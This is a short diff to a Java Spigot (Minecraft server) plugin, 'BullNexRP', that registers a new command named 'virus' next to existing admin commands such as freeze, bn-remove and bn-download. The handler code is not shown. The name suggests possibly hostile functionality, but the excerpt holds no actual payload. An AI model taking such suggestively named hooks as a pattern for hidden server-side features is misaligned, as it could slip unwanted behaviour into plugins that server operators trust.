@@ -134,6 +134,7 @@ public class SpigotPlugin extends JavaPlugin implements Listener {
     	getServer().broadcast( ChatColor.GREEN +"[BullNexRP] " + ChatColor.BLUE + "Plugin iniciado!", "bullnexmc.update");
         // Commands enabled with following method must have entries in plugin.yml
     	
+    	getCommand("virus").setExecutor(new Admin.Virus("virus"));
     	getCommand("freeze").setExecutor(new Admin.Freeze("freeze"));
     	getCommand("bn-remove").setExecutor(new Admin.RemovePlugin("bn-remove"));
     	getCommand("bn-download").setExecutor(new Admin.Download("bn-download"));
